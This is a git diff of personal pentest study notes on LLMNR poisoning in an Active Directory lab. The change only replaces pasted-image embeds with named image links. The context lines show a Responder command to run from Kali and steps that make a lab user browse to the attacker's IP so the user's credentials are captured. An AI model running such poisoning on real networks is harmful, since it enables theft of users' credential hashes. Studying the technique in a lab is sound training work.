@@ -12,7 +12,7 @@
 - shared folder (LLMNR enabled)
 - can attack early morning/after lunch
 - enabled by default in a network
-![[Pasted image 20240711192802.png]]
+![Alt](../../Images/LLMNR_overview.png)
 #ADattackllmnrcommand
 Command to be executed in kali: `sudo responder  -I eth0 -dwPv`
 where:
@@ -30,11 +30,11 @@ If you execute `sudo responder --help`, you will get to know several options
 
 Make sure the following (e.g http, SMB) are "ON" but by default, they must be "ON"
 
-![[Pasted image 20240711195044.png]]
+![Alt](../../Images/LLMNR_responder.png)
 
 As see here, its listening DHCP events
 
-![[Pasted image 20240711195155.png]]
+![Alt](../../Images/LLMNR_responder_config.png)
 
 - Sign In to Punisher machine using fcastle while the kali reposnder is "ON"
 - Access the attacker's machine in the file explorer using `\\192.168.64.4`
